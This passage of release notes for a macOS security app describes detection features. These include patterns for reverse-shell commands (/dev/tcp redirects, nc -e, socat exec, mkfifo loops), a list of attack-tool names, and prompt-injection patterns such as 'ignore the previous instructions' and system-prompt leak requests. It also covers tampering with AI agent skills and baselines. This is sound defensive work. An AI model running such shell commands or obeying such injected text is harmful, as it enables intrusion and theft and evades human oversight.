The record is now saved and carried across restarts (a resolved change drops out, so the same file changing again is announced again), and the menu gained "Update lockfile baseline to current state…" (after a confirmation the current lockfiles become the baseline and only new changes are announced). The Linux edition had the same repeat fixed (Linux 1.12.2). The added text is in 10 languages (based on machine translation, not reviewed by native speakers).
- **Fix: the autostart detection never reported the same path twice** (1.12.3, `PersistenceMonitorGuard`): a LaunchAgent or LaunchDaemon plist that had been reported was skipped for as long as the app ran, so deleting it and creating it again under the same name, or rewriting it with another payload, raised no second alert. Reported plists are now remembered by path and by the SHA-256 of their content: a deleted file is forgotten, and a changed one is examined again. It was found while measuring how long the notification takes: from creating the file to handing the notification to macOS, 1.08, 1.09 and 2.59 seconds in three measurements (the FSEvents delay of up to 1.5 seconds and a 1.0 second buffer). 6 tests added. The Linux client's autostart watch already reported a changed or re-created file again; its comparison by modification time and size became a comparison by content in Linux 1.12.5.
- (1.12.5) **Added: the AI agent setup audit gains four detections and change detection against an accepted state** (the "AI Agent Setup Audit" screen and the MCP tool `audit_agent_setup`). It closes the gap that the instruction files, skills and MCP settings an AI agent reads could be swapped later without anyone noticing. The idea was taken from reading NVIDIA's SkillSpector (a scanner for AI agent skills); the rules are RoamSwitch's own, and no rule or regular expression was copied. The finding ids, thresholds and wording are the same as in the Linux edition (1.12.6).
- (1.12.5) **Four new findings**: `homoglyph_name` (a skill folder name, file name or front-matter `name` that mixes Latin letters with lookalike Cyrillic, Greek or Armenian ones; Cyrillic is high, the others medium), `whitespace_padding` (text after 100 or more blanks on a line, or after 30 or more empty lines, so that the rest sits out of view), `hidden_encoded_text` (a base64 run of 60 characters or more that decodes to readable text, or `data:text/…;base64,`; the decoded text is never written into the result, only the name of the rule it would trip, such as instruction-override wording; hashes and images are left out), and `skill_broad_tool_grant` (a front-matter `allowed-tools` that permits arbitrary code: all of `Bash`, `*`, or `Bash(curl:*)` and the like; a narrowed grant such as `Bash(git status:*)` is left alone). A comment of the form `[//]: # (…)` is now treated like an HTML comment, a place that is not displayed, and a finding inside one is rated high.
- (1.12.5) **Change detection**: pressing "Mark this state as reviewed" on the screen records the instruction and skill files and the MCP server definitions as SHA-256 digests only (`~/Library/Application Support/RoamSwitch/agent_setup_baseline.json`, 0600; no file content and no MCP argument or environment value is stored). Later audits report a file whose content changed (`agent_file_changed`), a new file (`agent_file_added`), an MCP server whose settings changed (`mcp_server_changed`; high when the launch command, arguments, address, environment and the like changed, otherwise medium; the names of the changed keys are shown) and a new MCP server (`mcp_server_added`). Marking the state as reviewed while findings remain asks for a confirmation. **Only a person can move the baseline.** Neither an audit run nor the MCP tool moves it, so an AI agent cannot mark its own tampering as reviewed. A removed file is not reported. A new file is reported only inside a folder that was already covered when the state was accepted. `~/.claude.json` is rewritten by Claude Code all the time, so it is not compared as a whole file; only the MCP server definitions inside it are. The MCP tool's result gained the time the baseline was recorded (`baselineAcceptedAt`, null if none).
- (1.12.5) All 1387 tests pass, including 48 for the audit (18 of them for the new rules and change detection), and both the app and the standalone MCP server build. The Linux version of the same rules was run read-only over a real home folder (6 skills, 363 files), and the four new rules gave 0 false positives. How the screen looks on a real Mac will be checked after release.
- (1.12.5) The number of finding ids went from 22 to 30. The added wording is in 10 languages (based on machine translation, and not reviewed by native speakers).
- (1.12.5) The bundled apps are unchanged (AccessScope 0.3.7, PathScope 0.1.9, PersonalSOC 0.1.14).
- (1.12.6) **Changed: the process execution log's hash chain now covers the segment being written** ("Verify chain"). While records come in, a `cp` line holding the hash of all bytes so far is added every 10 seconds. An edit, removal or reordering of records before a checkpoint is found even in the open segment. Records after the newest checkpoint (about 10 seconds at most) cannot be verified, and the result shows their number. Sealing, rotation and crash recovery are unchanged. Tested on its own: detection of edits, removals and reordering, the count after the newest checkpoint, and consistency after sealing.
- (1.12.6) **Added: the AI agent setup audit tells you when the file holding the change-detection baseline is rewritten or deleted from outside the app.** The baseline of the reviewed state is stored inside the user's own account. On a Mac the agent normally runs as that same user, so it could rewrite the baseline and make its own changes invisible. When you press "Mark this state as reviewed", the privileged helper now keeps the baseline file's SHA-256 where only `root` can change it, in `/Library/Application Support/RoamSwitch/agent_setup_witness/` (one file per user id, owned by `root`, 0600). The audit window compares the file with it every time and shows, in red, that the baseline "has been rewritten" or "was not found". The helper accepts calls only from this signed app, so an agent cannot call it. It does not stop the file from being written, and an agent that can become `root` can rewrite the held digest too. The `audit_agent_setup` MCP tool runs in another process that cannot call the helper, so only the audit window makes this comparison. A baseline accepted by an earlier version is not compared until you press "Mark this state as reviewed" again. Checked on macOS 26.6.2 in a virtual machine by running the Developer ID–signed Release helper under launchd: the held digest is a `root`-owned 0600 file (named by user id), rewriting the baseline file is reported as rewritten and deleting it as not found, the user's own account can neither rewrite nor delete the held digest, and a client signed ad hoc, or with another identifier, is refused by the helper.
- (1.12.6) **Added: event forwarding (SIEM, syslog, webhook) is now on the Mac too** (Pro, off by default; menu bar, Malware Protection, "Event forwarding (SIEM)…"). The Linux edition had it and the Mac edition did not. It sends the incidents and notifications RoamSwitch recorded **only to destinations you typed in yourself**. What is sent is only the host name, event ID, time, kind, severity, rule, action taken, process ID and name, and a summary; file contents, the screen and typed text are never sent, and there is no receiving end on the developer's side. While it is off there is no thread and no socket (Zero Telemetry is kept).
  - **Destinations**: syslog (`udp://`, `tcp://`, `tls://`; RFC 5424 or CEF; TCP and TLS use octet counting or newline framing), a JSON Lines file (0600, symbolic links are not followed, rotated by size), and a webhook signed with HMAC-SHA256 (the curl that ships with macOS; the address and the signing key are kept in the Keychain and given to curl on standard input, not as arguments). Formats, escaping and the order of the JSON keys match the Linux edition, and the tests reuse the Linux edition's values.
  - **TLS**: the certificate chain and the host name are checked, and nothing is sent if they cannot be verified. A private CA can be given as a PEM file, in which case only that CA is trusted. With the macOS certificates, a wrong host name, an expired certificate and a self-signed one were refused, checked against public test hosts.
  - **When sending fails**: TCP, TLS and webhook events go to a queue on disk (0600, capped by size and age, kept across restarts) and are retried at growing intervals. Events not yet sent when the app quits stay in the queue too. UDP and the file are not retried. The numbers sent and failed and the latest error appear under "Status" in the settings window.
  - The Linux edition's destinations set by organisation policy (Fleet) and its refusal of internal webhook addresses do not exist on the Mac. It runs only while a Pro license is active.
  - Checked with local TCP and UDP listeners, TLS against `openssl s_server` (a verified server is reached; another CA, a certificate for another host name and an unreadable CA file send nothing) and a stand-in curl (the secret appears on standard input and never in the arguments). It was not tried against a real SIEM, syslog server or webhook receiver. The settings window was built and tested, but not viewed on a real display; that happens after release.
- (1.12.6) **Added: a way to check a web-rules file** (Settings, "Web shell detection rules"). "Check a rule file…" shows, for the JSON file you choose, how many rules are usable, typos (an unknown key comes with the closest known key as a suggestion) and whether it replaces an existing rule. "Export the schema" writes a JSON Schema to `~/Library/Application Support/RoamSwitch/web_rules.schema.json` so your editor can complete keys and flag typos (it is not put inside `rules.d`, because every `*.json` in `rules.d` is read as a rule file). Warnings at load time now include the position of the rule and of the pattern, and an `id` used twice is reported. When your rule replaces a built-in or feed rule it appears as a note, not a warning. The wording is the same as the Linux edition's `web-rules validate` (Linux 1.12.7).
- (1.12.6) **Changed: the Docker risk notification says when the container belongs to Exegol (the pentest environment).** A container flagged for privileged mode or a mounted docker.sock that has `org.exegol.*` labels or an official image gets one more sentence. Being an Exegol container alone never notifies.
- (1.12.6) **Fixed: in the in-app knowledge base (MCP `get_app_help`), the entry on web shell detection rules existed only in Japanese.** The other nine languages fell back to Japanese; all ten now have it, and the event forwarding entry is added. The added wording in 10 languages is based on machine translation and has not been reviewed by native speakers.
- (1.12.6) The bundled apps are unchanged (AccessScope 0.3.7, PathScope 0.1.9, PersonalSOC 0.1.14).
- (1.12.7) **Fixed: the honeytoken notification repeating every 30 seconds was still happening after the 1.12.4 fix** (since 1.12.1). The 1.12.4 exclusion worked only when the helper's exec recorder knew that the parent of `lsof` was RoamSwitch. When the recorder had not seen the app start (for example, the app had started before the helper), the parent's signature was unknown, so it was not excluded and the decoy's contents were read. That read moved the file's access time, and the loop of the app detecting again and running `lsof` again went on as before. The notification history of a Mac running 1.12.5 showed notifications for `~/.aws/credentials` and `~/.aws/config` every 30 seconds for about 5 hours, and notifications about an `lsof` run by RoamSwitch about every 10 minutes. When the parent is not in the exec record, the live process's signature is now checked (bundle ID, an Apple-issued certificate and the same team ID, the same requirement the helper imposes on its XPC peers), and if it is RoamSwitch itself the command is excluded before the decoy is read. A different binary merely placed at the same path, or an unsigned one, does not pass. The same command run by any other process is still reported as before. Checked with unit tests and with the signature check against the running app's process.
- (1.12.7) The Linux edition is not affected: it detects accesses differently (fanotify, where the event carries who opened the file, with no access-time polling and no exec rule that reads decoy contents).
- (1.12.7) The bundled apps are unchanged (AccessScope 0.3.7, PathScope 0.1.9, PersonalSOC 0.1.14).
- (1.12.7) That the notification stops on a real Mac after replacing the app with the fixed build will be checked after release.
- **Honeytoken (decoy credential file) notification repeating** (1.12.4, since 1.12.1): the honeytoken notification repeated every 30 seconds. When RoamSwitch detects an access to a decoy, it runs `lsof <decoy>` to find who holds the file. The helper's exec recorder judged that `lsof` to be "a command naming a decoy" and read the decoy's contents to confirm it was a real decoy. That read moved the file's access time, the app detected an access again and ran `lsof` again, and the loop produced a notification every 30 seconds for `~/.aws/credentials` and `~/.aws/config`. It became visible because 1.12.1 fixed the bug that silently dropped detections. On a real Mac, the history showed a detection every 30 seconds and the access time moving in step with the monitor's cycle. A direct child process of RoamSwitch itself (Developer ID signed, same team) is excluded before the decoy is read (a case where this exclusion did not apply remained, and 1.12.7 fixed it). The same command run by any other process is still reported as before. The Linux edition is not affected: it detects accesses differently (fanotify).
- **A warning for text that reads like an instruction to the AI, and how detection is shown** (1.12.8): when an MCP result contains text aimed at the AI ("ignore the previous instructions", fake system tags, impersonated tool calls, data smuggled out through an image link, claims of authority), a separate block at the end of the result warns about it. `get_process_tree` and `get_exposed_ports` now carry the untrusted-data notice for strings an attacker can choose. `audit_agent_setup` findings carry OWASP LLM Top 10 and ATT&CK tags, and `format: sarif` returns SARIF 2.1.0. Local AI runtimes are told apart with a confidence level (`aiRuntimes` in `get_exposed_ports`). The new MCP tool `get_detection_coverage` reports, for 22 ATT&CK techniques, whether RoamSwitch can find them, what it cannot see and whether the guard in charge is running. Each guard in `get_guard_status` gained `liveState` and `readers`, so a guard that cannot read its input is no longer shown as running.
- **Scan of development web folders** (1.12.9): what could not be examined (folders whose listing could not be read, files that could not be opened, files cut at 4 MB) is counted and shown in the result. A scan that skipped something says in its notice that "no detection" means no malicious code was found in what could be examined, and `get_guard_status` gained `webRulesFolderScan`.
- **Backup recency, accepting package CVEs, EPSS and dependency sources** (1.13.0): the diagnostic `backup_recency` reads the Time Machine setting and the time of the last backup and passes if it is within 7 days; it fails if no destination is set, there is no record, or the last backup is older than 7 days (backups by other apps such as Arq, or what permissions prevent reading, are "unknown" and do not count toward the score; local snapshots do not count as an outside backup. **Limit**: whether a restore works is not checked, and behaviour on a Mac with a configured destination was not confirmed). Package CVE findings can be accepted with a reason (required) and an expiry (30, 90, 180 or 365 days) through the "Accept…" and "Revoke" buttons (accepted findings stay in the list, are counted apart from "needs action", return to normal findings when they expire and are recorded in the timeline; matching includes the package version, so an earlier acceptance does not carry over when the same package moves to another vulnerable version. **MCP cannot accept**). The package CVE map can carry `epss` and `epssDate`, shown as `EPSS 12% (date)` (order: severity band, EPSS, CVSS, CVE ID; EPSS is a probability estimate of exploitation, not confirmation of exploitation; the feed in distribution has no EPSS values yet, so the column shows "—"). The new MCP tool `run_dependency_source_scan` (MCP tools 34 to 35) and the new tab "Dependency sources (Pro)" in the package CVE screen flag pip `extra-index-url` and npm scopes whose `resolved` is not npmjs but are not pinned by `@scope:registry=` in `.npmrc` (no network; URL credentials are dropped and only the host is shown. It does not ask a registry; npm packages without a scope, yarn Berry, Poetry and uv `[[tool.uv.index]]` are not covered). The MCP `get_detection_coverage` can output an ATT&CK Navigator layer with `format: "navigator"` (detected green, partial yellow, not seen red; the ATT&CK version is written as "19" but was not checked against MITRE's official information). The detection coverage table went from 22 to 25 techniques (2 detectable, 14 partial, 9 not seen).
- **Reverse shells, network configuration changes and execution record additions** (1.13.0, Pro): the always-on reverse shell detection (on by default, notify only) checks every 4 seconds whether the input and output of the logged-in user's own shells and interpreters are a TCP connection to an external server (`bash -i >& /dev/tcp/H/P 0>&1`, a python one-liner that `dup2`s a socket, `nc`/`ncat`/`socat` with `-e`, `--exec`, `exec:`, a `mkfifo` loop); it notifies only after seeing the same state twice, at most once per 15 minutes for the same program name connecting to the same peer (it neither ends the process nor blocks traffic; "Add the latest reverse shell detection to the allow list…" allows it as "name@destination". **Limit**: only the logged-in user's own processes, not root's; only connections to a public address; connections accepted on a listening port and interpreters not in the list are not seen). The network configuration change watch (on by default, notify only) compares the DNS servers, router and proxy auto-configuration (PAC) handed out by the connected network with the last state of the same network and notifies for a DNS server never seen there, a never-seen router and DNS server together (a stronger notice), a PAC on a never-seen host, and "Auto Proxy Discovery" (WPAD) newly turned on (a network seen for the first time is only remembered; a router-only change is only remembered; VPNs, DNS stored in the service configuration, the router itself, public DNS, secure DNS and DNS-over-HTTPS profiles are excluded; a change you recognise is accepted with "Update the network configuration baseline to the current state…". **Limit**: the rogue DHCP server itself is not seen, and a fake server that hands out the same DNS and router as before cannot be found; NetBIOS name resolution tampering is not watched). The new execution record rule `exec.reverse_shell_argv` (High, notify only; 14 rules) notifies when the command line of `sh -c`, or the arguments of a directly started `nc`/`ncat`/`socat`, contain a redirect to `/dev/tcp` or `/dev/udp` that carries a shell, a `mkfifo` loop, `nc -e <shell>`, `socat … exec:<shell>`, or `openssl s_client` piped to a shell (two conditions are needed at once, so a port check `echo > /dev/tcp/host/22`, `ssh -c <cipher>` and text merely written as a string do not notify). `exec.untrusted_location` now also notifies for unsigned (or ad-hoc signed) programs run from `/var/folders/…/T/` (the `$TMPDIR`) and `/Users/Shared/` besides `/tmp` (temporary executables of `go run`, `swift file.swift`, cargo, SwiftPM and Xcode are excluded). The execution recorder can load Sigma rules (`process_creation`, `~/Library/Application Support/RoamSwitch/sigma.d`, needs Full Disk Access; the supported fields, modifiers and conditions are the same as on Linux; rules that fail to load are listed with the reason; evaluation runs in the app, not in the root helper; a match only notifies and records to the timeline, once per 10 minutes per rule; regular expressions refuse back-references and nested repetition and have a 0.05 s limit per rule, and a slow rule is stopped after 3 times. **Limit**: operation through a real execution record was not confirmed). Notifications now carry who, what and where (honeytoken: the full path of the decoy, the accessing program (path and PID), the parent process and the command with secrets hidden; since the reader has often exited, when the record is on the commands started around that time are added too; the same material was added to notifications for autostart entries, important file and lockfile tampering, browser credentials, exposed ports, ransomware, execution detection, ARP spoofing, BadUSB, ClickFix, XProtect and Gatekeeper, downloads, Air-Gap, score drops and link protection; the link protection extension now records the app that tried to connect). Fixed: execution recorder notifications showed the title of `exec.ransomware_recovery_tampering` as the bare ID.
- **Autostart places, important files, browser credentials and two new diagnostics** (1.13.0): the autostart watch (Pro, on by default, notify only) now reads, every 5 seconds and besides LaunchAgent and LaunchDaemon, shell startup files, `~/.ssh/rc`, periodic scripts, git hook folders, login and logout hooks and Folder Action scripts, and notifies only for reverse-shell shapes, decode-and-run shapes, download-and-run shapes and running programs from temporary or hidden folders (login and logout hooks notify just by being placed; for startup files, `~/.ssh/rc` and git hooks, lines that already existed are not counted and only new suspicious lines are; the login items list is not read). The important-file tamper watch now includes all files under `/etc/sudoers.d/` and `/etc/pam.d/` (before, only `/etc/pam.d/sudo`; the first check after the update takes the current state once as the baseline, and so does the first check after the OS build changes). The browser credential watch (Pro, off by default) now supports Arc, Opera, Opera GX and Safari's `Cookies.binarycookies` (the Safari folder is not watched when Full Disk Access is missing and it cannot be opened; the browser's own reads and writes do not notify. **Limit**: the process holding the file open is looked up with `lsof` after the file changes, so a process that has already ended cannot be identified). The overall diagnosis gained `proxy_autodiscovery` (whether "Auto Proxy Discovery" (WPAD) is on or the network supplies a PAC; a PAC you set yourself is not a problem) and `agent_credential_files` (the files where Claude Code, Codex, Gemini CLI, GitHub Copilot and opencode store sign-in data; contents are not read; it flags permissions readable by others, files inside sync folders such as iCloud Drive or Dropbox, and files inside git-managed folders), making 21 items. **Limit**: PAC file contents and per-app proxy settings are not read, and only the standard places are checked. **A read of a credential file cannot be detected**: a Mac cannot show which process opened a file, and a decoy on a file that tools read at every start would always ring, so no decoy is placed on real credential paths.
- **AI agent setup audit, install-script drift and the ransomware detection windows** (1.13.0): the AI agent setup audit gained checks of `.vscode/tasks.json` in registered project folders (tasks that run automatically when the folder opens, `editor_auto_run_task`) and `.github/workflows` YAML (`workflow_pwn_request` runs pull request code in an environment with secrets, `workflow_expression_injection` puts text others can write into a script through `${{ }}`, `workflow_unpinned_action` for actions not pinned to a commit; `actions/*` and `github/*` are excluded), and it also reads agent memory folders (Claude Code, Codex, Windsurf, OpenClaw) with the same rules as instruction files (they are not part of the comparison with the accepted state). It also reads the Claude Code settings files (`settings.json` and `settings.local.json` in `~/.claude` and in the `.claude` of registered projects): `agent_settings_bypass`, `agent_settings_broad_allow`, `agent_settings_hook` (hooks shaped like fetch-and-run or decode-and-run are high wherever they are), `agent_settings_endpoint_override` (`ANTHROPIC_BASE_URL` pointing to a non-official host; high in a project setting) and `agent_settings_weakened`, which appears only when the settings got looser after being accepted (fewer deny rules, more or changed broad allows or hooks, a higher permission mode, sandbox or warnings turned off). Rule and command text is kept out of results and baselines and only digests are stored, and a state accepted by a version before settings were recorded is not compared until it is accepted again. The kinds of findings went from 30 to 39. The install script list (Pro) gained drift from the accepted state: after "Accept the current state", packages whose install-time code grew are shown above the list (a script added `script_added`, a command changed `script_changed`, compiled code added `native_added`, a new package with such code `new_package_with_install_code`); removals are not shown and only a person can accept. The MCP `run_package_lifecycle_script_scan` returns `baselineAcceptedAt` and `drift`, and the baseline stores only digests in `~/Library/Application Support/RoamSwitch/package_install_baseline.json` with 0600. Ransomware (entropy) detection also counts partial-file encryption (Mac only): besides the whole-file value 7.92, the first part read (up to 8 MiB) is split into 4 KiB windows, and a file with 4 or more windows and 2 or more windows at 7.9 or above is counted as the same write. It is not used for build artifact extensions or under `target`, encryption in blocks smaller than 4 KiB is not seen, and the burst condition (20 within 5 seconds) is unchanged. On 3,531 files in Documents, Desktop, Downloads and Pictures it added 0 detections; in a simulation on 150 real files with head-only and every-4-KiB encryption, the whole-file value alone caught 0 to 35% and the window check 100% (a simulation, not a check against real ransomware).
- **Link diagnostics, temporary allows, MCP annotations, active scan declarations and state files** (1.13.0): link diagnostics restore the defanged notation of threat reports (`hxxps://evil[.]example`, `example(dot)com`) to the original address before checking (the MCP `audit_url_safety` too; before, `https://` was only prepended and the broken string was checked). The link guard temporary allow ("Allow once (5 min)" in the notification and "Allow" in the warning panel) kept its end time only in a timer, so closing the app within 5 minutes left the allow in place; the end time is now saved and expired ones are removed after a restart (the help was corrected too: "Allow" in the warning panel lasts 5 minutes only, only "Block" is remembered, and the Mac has no screen to edit an allow list). Every MCP tool now has `annotations` (`readOnlyHint`, `destructiveHint`, `idempotentHint`, `openWorldHint`); the three tools that write (`run_active_vuln_scan` appends to the scan history, `audit_security_logs` updates the log pattern baseline and notification history, `run_npm_audit_signatures` has npm write its own cache) have `readOnlyHint` false, no tool is destructive, and only `run_npm_audit_signatures` connects to an external server (the opening "read-only" of the MCP `instructions` was corrected to match). The active scan declares for each check whether the diagnostic request stays in logs `ioc_in_logs`, whether it creates a temporary listener that accepts only `127.0.0.1` `temporary_listener`, and whether it sends more than 5 requests to one port `many_requests`, and each finding carries `confirmed`, `version_range_match` or `external_tool_report` (nmap output that RoamSwitch did not confirm); the MCP `run_active_vuln_scan` returns the declarations of the checks it ran, and the confirmation screen before starting says what happens on the port. State files used as a root of trust (the accepted agent setup baseline, the important-path FIM and lockfile tamper baselines, the paired Sensor state) are now not read if the same key appears twice (before, the later one was silently used). The bundled apps are AccessScope 0.4.0, PathScope 0.2.0 and PersonalSOC 0.2.0. All app tests (1830) passed (the 1 skip is from before). Reverse shell detection and the network configuration watch were tested only at unit level and not on a real network; the screens were checked by build and tests only, not on a real screen. The added text is in 10 languages (based on machine translation, not reviewed by native speakers).
- **Web server worker crash notification** (1.14.0, Pro): reads the error logs of nginx and Apache (Homebrew and the macOS built-in one) and notifies when workers die of a crash signal three times within five minutes.
- **Scanning a file re-created at the same path right after a quarantine** (1.14.0): files at that path were skipped for 60 seconds after a quarantine, so a web shell re-created right away was missed. They are now scanned.
- **Tamper detection for the evidence bundles** (1.14.0, forensic bundles): the SHA-256 of each bundle's manifest is written, together with the hash of the previous line, to a `chain.log` outside the bundles (`~/Library/Application Support/RoamSwitch/incident-evidence/chain.log`, 0600), one line at a time (the same design as the Linux app). The MCP `get_forensic_evidence_bundles` returns an `integrity` per bundle (`verified`, `manifest_altered`, `artifact_altered:<name>`, `artifact_missing:<name>`, `not_anchored`), the overall `chainOk` and `chainBrokenAt`, and `missingBundles` for bundles that are in the chain but gone. A broken chain gets no new lines, so the place where it broke is not hidden. **Limit**: this detects tampering; it does not prevent it. Someone who can rewrite both the folder and the log can build a consistent history.
- **The audit check `trust_anchors`** (1.14.0; the audit has 22 items, up from 21): a proxy that reads encrypted traffic (a company inspection proxy, a developer's debugging proxy, or malware) needs the Mac to trust its certificate authority. The check reads `security dump-trust-settings` for the user and administrator domains (it changes nothing) and counts the certificates that a person, an administrator or a profile set trust for. A name that looks like an interception tool fails the check; any other added certificate is shown as information, because mkcert and a company root are added on purpose. The detection coverage table gained `T1553.004` (Install Root Certificate) as "partial". **Limit**: a certificate an application carries for itself never touches the system trust and is not seen, and the check cannot tell when a certificate was added.
- **Secrets in published files, and unauthenticated admin pages on a development server** (1.14.0): the `include_build_output` argument of `audit_secrets` (MCP) reads the files a website's front end publishes (`dist`, `build`, `out`, `.next/static` and similar) and looks for embedded API keys, private keys and crypto-wallet keys, JWTs, and source maps (`.map`) that should not be in production; a found value is returned as its first 4 characters and its length only (limits: 5 MB per file, 200 MB in total, 20,000 files). The active-diagnostics probe `webvuln-unauth-admin` sends one GET each, with no cookie and no authentication, to 7 fixed paths on a development server port (`127.0.0.1`) and reports only an answer of 200 that carries data. It does not try to log in, guess or fuzz; the 7 requests stay in the log.
- **The MCP configuration audit finding `traffic_interception_env` (medium)** (1.14.0): flags an MCP server `env` that routes traffic through a proxy (`HTTP_PROXY` and the like), makes it trust an extra certificate authority (`NODE_EXTRA_CA_CERTS` and the like) or turns certificate verification off (`NODE_TLS_REJECT_UNAUTHORIZED=0`). Values are not shown (for a proxy, the host only). A company proxy can be a correct setting, and the finding says so.
- **More attack-tool names in the process recorder rules** (1.14.0, `exec.offensive_tool_inventory` and `exec.offensive_tool_burst`): chisel, ligolo, mimikatz, rubeus, sliver, havoc, fscan, the impacket tools and others. frp, nps, ngrok and ssh are left out because people use them every day. `exec.offensive_tool_burst` now also covers programs whose executable is under `/Users`, `/tmp`, `/private/tmp`, `/var/folders` and similar places (agents written in Go or Rust that run the tools themselves).
- **CSV exports run as formulas** (1.14.0): a cell beginning with `=`, `+`, `-`, `@`, a tab or a carriage return could be run as a formula by a spreadsheet. Such cells now start with `'`.
- **More patterns in the warning for text that looks like an instruction to the AI in MCP results** (1.14.0): requests to list tools or print API keys, tokens or environment variables (`system-prompt-leak`), requests to confirm that the caller has authority (`authority-claim`), and "report that it is safe" or "mark it resolved" (`instruction-override`). No category was added.
- 1.14.0 checks and bundling: all 1,953 app tests pass. The screens were checked only through the build and the tests, not on a real display. The added text is in 10 languages (based on machine translation, not reviewed by native speakers). The bundled AccessScope became 0.4.1.
- (1.15.0) **Fixed: a Mac without Pro was asked for the "Input Monitoring" permission (receive keyboard input) after the first launch.** It is asked only when you turn on the Unauthorized USB / BadUSB Physical Port Guard. If you do not allow it, the guard's settings show why, with a button that opens the setting. The Accessibility permission is also asked only after you decide to turn the guard on.
- (1.15.0) **Fixed: when the process execution recorder's chain check ("Verify chain") found a problem, the reasons were shown in English.** They now follow the display language (10 languages). The translations are machine-generated and have not been checked by native speakers (other than Japanese).
- (1.15.0) **Fixed: the notice for disabling a login shell after a web shell detection was recorded twice in the notification history and in event forwarding.** It is recorded once.
- (1.15.0) **Fixed: change detection for install-time code said "nothing was added" for folders you never marked as reviewed.** It now shows how many folders were not compared (window and MCP `uncoveredFolders`). When no node_modules folder is found it says there is nothing to compare.
- (1.15.0) **Fixed: the dependency CVE match (per language and Homebrew) showed the same CVE more than once.** It is merged into one finding with the nearest fixed version (the smallest).
- (1.15.0) **Fixed: the per-language dependency CVE match said "none found" for ecosystems that have no CVE data.** It now shows, per ecosystem, how many dependencies were not checked (window and MCP `dependencyCountByEcosystem` and `ecosystemsWithoutMap`).
- (1.15.0) **Added: the AI-agent setup audit flags settings files that every user can write** (`agent_settings_writable`, high; finding kinds go from 39 to 40). It covers Claude Code's settings.json, VS Code's tasks.json and GitHub Actions workflows. Only a mode the other users can write (666 and the like) counts; a group-writable mode (664) is not flagged.
- (1.15.0) **Fixed: the event forwarding file destination could be saved in a place that cannot be written.** When the folder cannot be written, the reason is shown on saving and forwarding does not use it at start-up. The messages about the settings and the result of the test send now follow the display language (10 languages).
- (1.15.0) **Fixed: English sentences appeared in the Japanese screen.** The helper sandbox notice, and the reasons shown when restoring from a ransomware snapshot (a wording mismatch that left one untranslated, a missing translation, and the system's English text for a failed copy) now follow the display language.
- (1.15.0) **Fixed: in ransomware containment, an unsigned program with a listed name (such as `~/Downloads/node`) was left out of the suspects by its name alone.** For a program whose signature is not valid, the name protects only when the program is in a system location (/System, /usr, /bin, /sbin, /Library/Apple); for an interpreter such as node or python, only when the script it runs is in one. Programs with a valid signature are protected as before.
- (1.15.0) **Fixed: in the high-entropy ransomware detection, the figure of a partly encrypted file was mixed into the "average entropy" of all files.** The average of the files judged as a whole and the highest window of the files judged by a part are now shown separately. What counts toward a burst, and the containment, are unchanged.
- (1.15.0) **Fixed: in ransomware containment, a signed interpreter was dropped from the candidates by its signature alone.** An attack script run by Apple's bash or python3, or by nodejs.org's node, was dropped too. sh, bash, zsh, python, node, perl, ruby, php and the like are now protected, even when signed, only when the script they run is in a system location. With no script to look at (`-c`, standard input) they are not protected. Finder, Xcode, VS Code and the like are protected as before.
- (1.15.0) **Fixed: in the high-entropy ransomware detection, an unsigned executable with a listed name (`~/Downloads/tar`, `/tmp/node`) was counted as a safe writer by its name alone, and the burst never reached containment.** A name such as tar, git, node or python3 now counts as safe only when the executable is in a system location or in /opt/homebrew or /usr/local (links are resolved first), or when its signature is valid. Bulk writes by Homebrew's git, node and python are still not flagged.
- (1.15.0) **Fixed: in the high-entropy ransomware detection, allowlisted writers (openssl, gpg, 7z, python3, node and others) could encrypt existing files in place without being frozen.** When only allowlisted writers are found, a burst that just creates new files is still ignored. It is now detected when half or more of the burst's files are existing files written over (overwritten in place, deleted and recreated, or replaced by a rename onto an existing name), or when 15 or more files are deleted or renamed away while the new high-entropy files are created. To go back, run `defaults write com.tetsuharu.RoamSwitch RoamSwitch.RansomwareEntropyStrictAllowlist -bool false`. **Limit**: the writing process is not known, so files removed by another process in the same folder in the same seconds are counted too.
- (1.15.0) **Fixed: in ransomware containment, a user's shell that was only standing in a working folder could be chosen as the process to stop.** Since signed interpreters stopped being protected by their signature, an interactive zsh or bash standing in the Desktop folder, for example, was no longer protected, so when a canary was tampered with and no process held a file, that shell became a candidate. Only a file that is really open (a numbered `lsof` descriptor) now counts. The working directory and the program file do not. A process holding a canary file is chosen first, then one with a file open for writing. **Limit**: a process that opens no file of a working folder for writing, such as a `curl | bash` that reads standard input, is not a candidate.
- (1.15.0) **Fixed: deleting 15 or more files in Finder could turn the burst of an allowlisted writer into containment.** If you deleted 15 or more files in another folder in the same 5 seconds in which an allowlisted writer created new files, the deletions were added up. Only deletions and renames away directly in the folders where the new high-entropy files were created are now counted.
- (1.15.0) **Fixed: `liveState` in the detection coverage (`get_detection_coverage`) and `get_guard_status` said "on" whenever the toggle was on, even when Pro was not active or the helper was not connected.** A detection that needs Pro but does not have it is now `off` (reason `pro_not_active`), one that needs the helper but is not connected is `off` (reason `helper_not_connected`), and one that uses the helper only for a part (such as cutting the network) is `partial`. The app writes a record of the helper connection every minute, and that is what is read. When the app is not running or the record is old, a detection that needs the helper is `unknown`. A bug that left the Pro record at the last session's `true` when the licence failed to validate at launch is fixed too. Granted permissions (such as Full Disk Access) are still not checked.
- (1.15.0) **Fixed: the notice that a login shell was disabled no longer reached the notification history for Free users.** Free users get no notification and one history entry. Pro is unchanged.
- (1.15.0) **Added: a reflected-XSS probe, `webvuln-xss`, in active diagnostics**. GET only: a harmless marker without any script is put into parameters read from the root page's links and GET forms, and a finding is reported only if it comes back unescaped where markup or an attribute quote takes effect. At most 12 requests go to one port. When nothing is reflected the result is "could not confirm", never "safe". The Linux Client edition has the same probe.
- (1.15.0) The bundled apps are now AccessScope 0.4.2 and PersonalSOC 0.2.1 (PathScope 0.2.0 is unchanged).
- (1.15.1) **Fixed: the dependency-lockfile guard used too much CPU.** Every time one file in a watched folder changed, it walked the whole folder (up to 6 levels deep) again on the main thread. With a development folder watched (about 62,000 entries, about 0.58 s per walk), a scan ran every 2 to 4 seconds while files were being edited, and RoamSwitch used 5 to 25% of a CPU. It now scans only when a lockfile is created, changed or removed, or a folder appears, goes or moves. A change under `.git`, `node_modules`, `target` and the like, which the walk never enters, no longer counts. The scan runs off the main thread, one at a time.
